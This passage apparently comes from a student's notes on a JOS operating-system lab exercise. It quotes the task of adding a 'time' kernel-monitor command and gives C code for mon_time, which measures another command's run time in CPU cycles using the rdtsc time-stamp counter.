> K> time kerninfo
>     Special kernel symbols:
>     _start f010000c (virt) 0010000c (phys)
>     etext f0101a75 (virt) 00101a75 (phys)
>     edata f010f320 (virt) 0010f320 (phys)
>     end f010f980 (virt) 0010f980 (phys)
>     Kernel executable memory footprint: 63KB
>     kerninfo cycles: 23199409
> K> 
> ```
>
> Here, 23199409 is the running time of the program in cycles. As JOS has no support for time system, we could use CPU time stamp counter to measure the time.
>
> **Hint: You can refer to instruction "rdtsc" in Intel Mannual for measuring time stamp.**
> **("rdtsc" may not be very accurate in virtual machine environment. But it's not a problem in this exercise.)**

> ​	rdtsc: https://blog.csdn.net/qingzai_/article/details/75369880

```c
static struct Command commands[] = {
    { "help", "Display this list of commands", mon_help },\
    { "kerninfo", "Display information about the kernel", mon_kerninfo },
    { "backtrace", "Display backtrace info", mon_backtrace },
    { "time", "Time [command]", mon_time },
};

int
mon_time(int argc, char **argv, struct Trapframe *tf) {
    if (argc != 2)
        return -1;
    uint64_t before, after;
    int i; 	struct Command command;
    /* search */
    for (i = 0; i < ARRAY_SIZE(commands); i++) {
        if (strcmp(commands[i].name, argv[1]) == 0) {
            break;
        }
    }
    if (i == ARRAY_SIZE(commands))
        return -1;
    /* run */
    before = read_tsc();
    (commands[i].func)(1, argv+1, tf);
    after = read_tsc();
    cprintf("%s cycles: %d\n", commands[i].name, after - before);
    return 0;
}
```

